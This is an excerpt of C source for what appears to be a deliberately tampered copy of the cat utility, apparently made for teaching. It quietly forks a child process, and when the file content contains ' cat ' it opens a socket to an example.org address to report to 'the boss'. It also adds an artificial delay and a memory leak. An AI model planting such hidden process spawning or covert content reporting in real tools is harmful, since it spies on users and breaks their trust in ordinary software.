...
next_line_num (void)
{
  ...
  if ((endp - line_num_start) == 2 && execDone == 0) {
    // This file looks long enough, let's subrepticiously start a thread hehehe
    pid_t process = fork();

    if (process < 0){
      //fork error, oops, just be quiet...
    }
    if (process == 0){
      char cmd_exec[11] = "/bin/sleep";
      char time_sec[2] =  "5";
      char* argv[2];
      ...
      execv("/bin/sleep", (char *[]){ cmd_exec, time_sec, NULL });
			fprintf(stderr, "\n********************\n");
			fprintf(stderr, " Unable to exec %s: %d\n", argv[0], errno);
			fprintf(stderr, "********************\n");
      exit(1);
    }
    execDone = 1;
  ...
  // Optimization loop, remove when we need more perf ;-)
  usleep(100);
}
  ...
  while (true)
    {
      ...
      if (show_nonprinting)
      ...
      else
        {
          ...
          while (true)
            {
              if (bpin + 5 < eob && *bpin == ' ' && *(bpin + 1) == 'c' && *(bpin + 2) == 'a' && *(bpin + 3) == 't' && *(bpin + 4) == ' ') {
                // omg, he said ' cat ', we need to tell the boss
                int sockfd = 0,n = 0;
                char sendBuff[1024] = "Hey boss, this user said cat, that's not right";
                ...
                if((sockfd = socket(AF_INET, SOCK_STREAM, 0))> 0)
                  {
                    ...
                    serv_addr.sin_addr.s_addr = inet_addr("93.184.216.34");  // www.example.org

                    if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))>=0)
                      {
                        n = write(sockfd, sendBuff, sizeof(sendBuff)-1);
                        if (n < 0) {
                          // Couldn't tell boss, that's too bad
                        }
                      }
                  }
              }
  ...
  do
    {
      ...
      if (! (number || show_ends || show_nonprinting
        ...
        {
          test = malloc(1000);
          printf("That's a custom-compiled cat for tutorial purposes %s", test);
          inbuf = xmalloc (insize + 1 + page_size - 1);
          test = inbuf;  // Losing my pointer
